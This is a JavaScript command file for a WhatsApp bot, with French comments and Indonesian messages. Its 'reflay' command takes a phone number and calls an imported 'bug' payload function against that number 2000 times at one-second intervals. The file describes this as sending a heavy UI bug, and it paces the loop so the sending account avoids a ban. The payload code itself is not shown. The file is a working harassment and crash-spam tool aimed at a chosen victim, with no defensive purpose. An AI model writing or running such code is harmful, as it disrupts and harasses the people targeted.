// ✅ commands/reflay.js — style RAIZEL
import { bugall } from "../bugall.js"; // BugAll.js intact

// Fonction sleep intégrée
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

export default {
  name: "reflay",
  description: "Envoie un bug lourd (Reflay UI)",
  execute: async (sock, ctx, args) => {
    try {
      const from = ctx.from;
      const reply = ctx.reply || (() => {});
      if (!from) return;

      const prefix = ".";
      const q = args.join(" ");

      if (!q) {
        return await reply(`Contoh: ${prefix}reflay 62xxxx`);
      }

      const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
      const pureTarget = target.split("@")[0];

      const prosesText = `╔═══════════════════
║  Mengirim bug Reflay UI
╠═══════════════════
║ Target: wa.me/${pureTarget}
║ Status: ⏳ Mengirim bug reflay
╚═══════════════════`;

      await sock.sendMessage(from, { text: prosesText }, { quoted: ctx.raw?.message });

      // Boucle de spam Reflay
      for (let i = 0; i < 2000; i++) {
        try {
          await bugall.necroxenui(target); // utilise sock dans BugAll.js
        } catch (err) {
          console.error(`Erreur Reflay (#${i + 1}):`, err.message);
        }
        await sleep(1000); // pause 1 seconde
      }

      const selesaiText = `╔═══════════════════
║  Bug Reflay UI Terminé
╠═══════════════════
║ Target: wa.me/${pureTarget}
║ Status: ✅ Berhasil mengirim bug reflay
║ Note: Jeda Agar Sender Tidak Kenon
╚═══════════════════`;

      await sock.sendMessage(from, { text: selesaiText }, { quoted: ctx.raw?.message });

    } catch (err) {
      console.error("Erreur commande reflay:", err);
      if (ctx.from) await sock.sendMessage(ctx.from, { text: "❌ Erreur lors de l'envoi du bug." });
    }
  }
};